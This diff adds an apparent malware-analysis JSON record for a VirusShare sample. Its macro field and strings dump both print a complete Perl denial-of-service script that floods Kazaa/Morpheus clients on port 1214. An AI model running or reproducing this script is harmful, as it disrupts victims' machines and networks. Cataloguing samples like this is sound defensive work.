@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands",
+            "open": "May open a file"
+        },
+        "macro": "#!/usr/bin/perl\n#\n#Kazaa/Morpheus Denial of Service Attack\n#Coded by Paul Godfrey\n#PaulG@Crackdealer.com\n#\n#Problem:  Both Kazaa and Morpheus filesharing applications have \"backdoors\"\n#which allow anonymous file access to their shared folder.  What does this have\n#to do with Denial of Service?  Unlike connections made from other users\n#of the applications, the number of connections to the backdoor cannot be\n#regulated or detected by the client.  This obviously will allow us to flood the\n#server with requests and therefore use up all of the available bandwidth.\n#Also due to the fact that most users have setup their firewall privileges so\n#that Kazaa or Morpheus is allowed access to open connections to outside sources\n#this attack will bypass most personal firewall clients such as Zone Alarm.\n#\n#Enjoy.\n#\n#Usage: ./km.pl -h victimip\n\nuse Socket; \nuse Getopt::Std; \n\ngetopts(\"h:\", \\%args); \n\nprint(\"\\nK/M Denial of Service\\n\"); \nif (!defined $args{h}) { \nprint(\"Usage: km.pl -h victimip\\n\\n\"); \nexit; } \n\n$host = $args{h}; \n$target = inet_aton($host) || die(\"inet_aton problems; host doesn't exist?\"); \n\n$trash=\"A\"x100;\n\n&exec_cmd($command); \n\nsub exec_cmd { \nfor($count=1;$count<=1000;$count++)\n{\nsendraw(\"GET /\\\"$trash\\\" HTTP/1.0\\n\\n\");\nprint(\"|\");\n}\nprint(\"\\nData Sent.\\n\\n\"); \n} \n\nsub sendraw { \nmy ($pstr)=@_; \nsocket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || \ndie(\"Socket problems\\n\"); \nif(connect(S,pack \"SnA4x8\",2,1214,$target)){ \nmy @in; \nselect(S); $|=1; print $pstr; \nwhile(< S >){ push @in, $_; \nprint STDOUT \".\" if(defined $args{X});} \nselect(STDOUT); close(S); return @in; \n} else { die(\"Can't connect...\\n\"); } \n} "
+    },
+    "filename": "VirusShare_37d8b33d6f5e3d0b8f357405a0f0a59b",
+    "filesize": 1647,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "37d8b33d6f5e3d0b8f357405a0f0a59b",
+        "sha1": "64334880b84d8728a5fdc049992db2d372b2597b",
+        "sha256": "fad2ef1d6bd1b6f628e4df197195a0a3e50c0c953de697287632b21c00b8e1d3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "#Kazaa/Morpheus Denial of Service Attack",
+            "#Coded by Paul Godfrey",
+            "#PaulG@Crackdealer.com",
+            "#Problem:  Both Kazaa and Morpheus filesharing applications have \"backdoors\"",
+            "#which allow anonymous file access to their shared folder.  What does this have",
+            "#to do with Denial of Service?  Unlike connections made from other users",
+            "#of the applications, the number of connections to the backdoor cannot be",
+            "#regulated or detected by the client.  This obviously will allow us to flood the",
+            "#server with requests and therefore use up all of the available bandwidth.",
+            "#Also due to the fact that most users have setup their firewall privileges so",
+            "#that Kazaa or Morpheus is allowed access to open connections to outside sources",
+            "#this attack will bypass most personal firewall clients such as Zone Alarm.",
+            "#Enjoy.",
+            "#Usage: ./km.pl -h victimip",
+            "use Socket; ",
+            "use Getopt::Std; ",
+            "getopts(\"h:\", \\%args); ",
+            "print(\"\\nK/M Denial of Service\\n\"); ",
+            "if (!defined $args{h}) { ",
+            "print(\"Usage: km.pl -h victimip\\n\\n\"); ",
+            "exit; } ",
+            "$host = $args{h}; ",
+            "$target = inet_aton($host) || die(\"inet_aton problems; host doesn't exist?\"); ",
+            "$trash=\"A\"x100;",
+            "&exec_cmd($command); ",
+            "sub exec_cmd { ",
+            "for($count=1;$count<=1000;$count++)",
+            "sendraw(\"GET /\\\"$trash\\\" HTTP/1.0\\n\\n\");",
+            "print(\"|\");",
+            "print(\"\\nData Sent.\\n\\n\"); ",
+            "sub sendraw { ",
+            "my ($pstr)=@_; ",
+            "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || ",
+            "die(\"Socket problems\\n\"); ",
+            "if(connect(S,pack \"SnA4x8\",2,1214,$target)){ ",
+            "my @in; ",
+            "select(S); $|=1; print $pstr; ",
+            "while(< S >){ push @in, $_; ",
+            "print STDOUT \".\" if(defined $args{X});} ",
+            "select(STDOUT); close(S); return @in; ",
+            "} else { die(\"Can't connect...\\n\"); } "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263718",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
